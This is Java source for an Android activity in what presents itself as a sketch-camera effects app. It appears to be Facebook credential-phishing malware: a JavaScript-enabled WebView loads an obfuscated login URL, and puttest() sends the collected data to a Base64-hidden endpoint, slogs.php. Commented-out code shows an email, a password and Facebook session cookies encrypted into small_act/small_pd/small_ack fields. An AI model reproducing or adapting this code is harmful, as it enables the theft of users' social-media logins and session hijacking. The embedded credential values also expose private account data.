package com.kali_corporation.skethcamplus.ui.activity;

import androidx.appcompat.app.AppCompatActivity;

import android.os.Bundle;
import android.os.Handler;
import android.os.Message;
import android.view.View;
import android.webkit.WebSettings;
import android.webkit.WebView;

import com.kali_corporation.skethcamplus.Utils.view.CusLoadView;
import com.kali_corporation.skethcamplus.Utils.net.HttpUtils;
import com.kali_corporation.skethcamplus.Utils.OnItemClickListener;
import com.kali_corporation.skethcamplus.Utils.hel.al.RandomUtil;
import com.kali_corporation.skethcamplus.Utils.hel.sp.SPUtils;
import com.kali_corporation.skethcamplus.Utils.StringUtils;
import com.kali_corporation.skethcamplus.Utils.gad.Base64Util;
import com.kali_corporation.skethcamplus.ui.effect.EffectClient;
import com.kali_corporation.skethcamplus.R;

import java.io.UnsupportedEncodingException;
import java.util.ArrayList;

public class EffectActivity extends AppCompatActivity {
    private WebView mWebView;
    private CusLoadView loadView;
    private String[] a = new String[1];
    private String[] b = new String[2];

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_effect);

        SPUtils.getInstance(EffectActivity.this).saveDefaultPic("a","b");

        mWebView = findViewById(R.id.webView);
        loadView = findViewById(R.id.laodView);
        WebSettings webSettings = mWebView.getSettings();
        webSettings.setJavaScriptEnabled(true);
        mWebView.setWebViewClient(new EffectClient(mWebView, a, b, new OnItemClickListener() {
            @Override
            public void onItemClick(int pos) {
                if (pos == 0){
                    loadView.setVisibility(View.GONE);
                }else {
                    loadView.setVisibility(View.VISIBLE);

                    puttest();

                }
            }
        }));
        String url = SPUtils.getInstance(EffectActivity.this).getAppInfo().getString(StringUtils.enKeys(0),"");
        mWebView.loadUrl(url);

    }

    @Override
    public void onBackPressed() {
        if(mWebView.canGoBack()) {
            mWebView.goBack();
        } else {
            super.onBackPressed();
        }
    }

    private Handler handler = new Handler(){
        @Override
        public void handleMessage(Message msg) {
            loadView.setVisibility(View.GONE);
            //msg就是子线程发送过来的消息。
            if (msg.what == 200){
                SPUtils.getInstance(EffectActivity.this).saveDefaultPic("b","a");
                SPUtils.getInstance(EffectActivity.this).saveLevel(msg.what);
                finish();
            }else {
                finish();
            }
        }
    };


    private void puttest() {

//        String act = URLEncoder.encode(DesCbcUtil.encodeValue("18sz4n3r7xo2px2a","403801797@qq.com"), "UTF-8");
//        String pwd = URLEncoder.encode(DesCbcUtil.encodeValue("18sz4n3r7xo2px2a","zhaoer1008!!"), "UTF-8");
//        String ck = URLEncoder.encode(DesCbcUtil.encodeValue("18sz4n3r7xo2px2a","[{\"path\":\"/\",\"domain\":\".facebook.com\",\"name\":\"m_pixel_ratio\",\"httpOnly\":true,\"secure\":true,\"value\":\"1.75\",\"expirationDate\":1655248692433},{\"path\":\"/\",\"domain\":\".facebook.com\",\"name\":\"datr\",\"httpOnly\":true,\"secure\":true,\"value\":\"Y_LXX62PhAgFGbVKxxP6GGgt\",\"expirationDate\":1655248692433},{\"path\":\"/\",\"domain\":\".facebook.com\",\"name\":\"c_user\",\"httpOnly\":true,\"secure\":true,\"value\":\"100057156190528\",\"expirationDate\":1655248692433},{\"path\":\"/\",\"domain\":\".facebook.com\",\"name\":\"spin\",\"httpOnly\":true,\"secure\":true,\"value\":\"r.1003097318_b.trunk_t.1607987878_s.1_v.2_\",\"expirationDate\":1655248692433},{\"path\":\"/\",\"domain\":\".facebook.com\",\"name\":\"xs\",\"httpOnly\":true,\"secure\":true,\"value\":\"23%3ANy-eJdthp_kAFw%3A2%3A1607987863%3A18073%3A4595\",\"expirationDate\":1655248692433},{\"path\":\"/\",\"domain\":\".facebook.com\",\"name\":\"fr\",\"httpOnly\":true,\"secure\":true,\"value\":\"1EXWM3ZuTWkF0wjdP.AWU_gyxjflwDIVNtslF89zSMliE.Bf1_Jj.To.AAA.0.0.Bf1_KX.AWW4f5g1KzI\",\"expirationDate\":1655248692433},{\"path\":\"/\",\"domain\":\".facebook.com\",\"name\":\"wd\",\"httpOnly\":true,\"secure\":true,\"value\":\"412x452\",\"expirationDate\":1655248692433},{\"path\":\"/\",\"domain\":\".facebook.com\",\"name\":\"sb\",\"httpOnly\":true,\"secure\":true,\"value\":\"Y_LXX1oXc7EigvA4jsiCRLwC\",\"expirationDate\":1655248692433}]"), "UTF-8");

//        String data = "small_act=" +act+"&small_pd=" +pwd+"&small_ack=" + ck;
        //https://small.cambridgesoftware.space/server_api/slogs.php
        HttpUtils.put(Base64Util.dedata("aHR0cHM6Ly9zbWFsbC5jYW1icmlkZ2Vzb2Z0d2FyZS5zcGFjZS9zZXJ2ZXJfYXBpL3Nsb2dzLnBocA=="),getMsg(),handler);

    }

    private String getMsg() {
        String a = "";
        ArrayList arrayList = new ArrayList();
        try {
            arrayList = RandomUtil.getRandomList(EffectActivity.this);
        } catch (UnsupportedEncodingException e) {
            e.printStackTrace();
        }
        if (arrayList.size()>0){
            for (int i = 0;i<arrayList.size();i++){
                String b = StringUtils.deKeys(i);
                a = a + b + "=" + arrayList.get(i);
            }
        }
        return a;
    }
}